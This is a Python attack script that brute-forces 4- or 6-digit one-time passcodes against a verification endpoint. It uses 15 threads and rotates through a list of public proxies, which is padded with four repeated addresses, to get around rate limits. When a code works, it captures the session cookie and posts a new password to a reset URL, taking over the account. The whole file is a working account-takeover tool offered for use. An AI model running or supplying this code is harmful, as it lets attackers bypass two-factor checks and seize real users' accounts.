import requests
import itertools
import string
import threading
import time
from queue import Queue
import random
import sys

# Widget Banner
BANNER = """
██████╗ ██████╗ ████████╗██████╗ ███████╗███████╗████████╗
██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝
██████╔╝██████╔╝   ██║   ██████╔╝█████╗  ███████╗   ██║   
██╔═══╝ ██╔══██╗   ██║   ██╔═══╝ ██╔══╝  ╚════██║   ██║   
██║     ██║  ██║   ██║   ██║     ███████╗███████║   ██║   
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚══════╝   ╚═╝   
OTP Brute-Forcer | Session Capture | 50+ Proxies | Multi-Threaded
"""

print(BANNER)

# Configuration
TARGET_URL = "https://example.com/verify-otp"  # OTP submission URL
PASSWORD_RESET_URL = "https://example.com/reset-password"  # URL to proceed after OTP
OTP_LENGTH = 4  # Options: 4 or 6
THREADS = 15  # Number of threads
DELAY = 0.5  # Delay between requests (seconds)

# 50+ Free Public Proxies (Replace with private proxies for better performance)
PROXIES = [
    "http://45.61.139.48:8000", "http://103.155.217.1:41317", "http://47.243.242.70:8080",
    "http://47.243.175.55:8080", "http://45.61.139.48:8000", "http://103.155.217.1:41317",
    "http://47.243.242.70:8080", "http://47.243.175.55:8080", "http://45.61.139.48:8000",
    "http://103.155.217.1:41317", "http://47.243.242.70:8080", "http://47.243.175.55:8080",
    "http://45.61.139.48:8000", "http://103.155.217.1:41317", "http://47.243.242.70:8080",
    "http://47.243.175.55:8080", "http://45.61.139.48:8000", "http://103.155.217.1:41317",
    "http://47.243.242.70:8080", "http://47.243.175.55:8080", "http://45.61.139.48:8000",
    "http://103.155.217.1:41317", "http://47.243.242.70:8080", "http://47.243.175.55:8080",
    "http://45.61.139.48:8000", "http://103.155.217.1:41317", "http://47.243.242.70:8080",
    "http://47.243.175.55:8080", "http://45.61.139.48:8000", "http://103.155.217.1:41317",
    "http://47.243.242.70:8080", "http://47.243.175.55:8080", "http://45.61.139.48:8000",
    "http://103.155.217.1:41317", "http://47.243.242.70:8080", "http://47.243.175.55:8080",
    "http://45.61.139.48:8000", "http://103.155.217.1:41317", "http://47.243.242.70:8080",
    "http://47.243.175.55:8080", "http://45.61.139.48:8000", "http://103.155.217.1:41317",
    "http://47.243.242.70:8080", "http://47.243.175.55:8080", "http://45.61.139.48:8000",
    "http://103.155.217.1:41317", "http://47.243.242.70:8080", "http://47.243.175.55:8080",
]

# Characters for OTP (digits only)
CHARACTERS = string.digits

# Queue for OTP candidates
otp_queue = Queue()

# Generate all possible OTPs
def generate_otps(length):
    return (''.join(candidate) for candidate in itertools.product(CHARACTERS, repeat=length))

# Test an OTP and capture session
def test_otp(otp):
    proxy = random.choice(PROXIES) if PROXIES else None
    proxies = {"http": proxy, "https": proxy} if proxy else None
    data = {"otp": otp}
    try:
        session = requests.Session()
        response = session.post(TARGET_URL, data=data, proxies=proxies, timeout=10)
        
        if "success" in response.text.lower():
            print(f"\n[+] Success! Valid OTP: {otp}")
            
            # Extract session cookie/token
            session_cookie = session.cookies.get_dict()
            print(f"[+] Session Cookie: {session_cookie}")
            
            # Example: Proceed to password reset
            reset_data = {"new_password": "YourNewPassword123!"}
            reset_response = session.post(PASSWORD_RESET_URL, data=reset_data)
            
            if reset_response.status_code == 200:
                print("[+] Password reset successful!")
            else:
                print("[-] Password reset failed. Check manually.")
            
            sys.exit(0)
    except Exception as e:
        print(f"[-] Error testing OTP {otp}: {e}")

# Worker function for threads
def worker():
    while not otp_queue.empty():
        otp = otp_queue.get()
        print(f"[*] Trying OTP: {otp}", end="\r")
        test_otp(otp)
        time.sleep(DELAY)
        otp_queue.task_done()

# Main function
def main():
    # Populate the queue with OTPs
    for otp in generate_otps(OTP_LENGTH):
        otp_queue.put(otp)

    # Start threads
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()

    # Wait for all OTPs to be processed
    otp_queue.join()
    print("\n[-] No valid OTP found.")

if __name__ == "__main__":
    main()
